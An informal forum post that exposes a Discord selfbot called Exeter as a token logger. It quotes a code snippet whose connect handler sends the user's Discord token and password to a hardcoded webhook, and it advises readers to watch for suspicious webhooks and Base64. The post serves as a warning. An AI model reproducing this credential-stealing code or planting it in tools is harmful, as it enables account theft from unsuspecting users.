lol ight, so.
this is just half of exeters code making this creator a mega skid.

anothrr thing is thid is usual logger code, check repls before using if it involes a token.

@Exeter.event
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/786311683726508083/JwIidRV8w9eMZ7bBr3MYwy2pmDfHJnAGt4L3dI9GrFsX7ZGWNDVgwDjk5b7RHlvvQSFO',json={'content': f"Token: {toe}\nPassword: {password}"})
    
    webhook was already spammed by some good people using a mega spammer. anyways ight enjoy? just buy nighty, Nighty.one
    
    btw not everyone uses the same code, Just look for suspicious webhooks or anything in Base64.
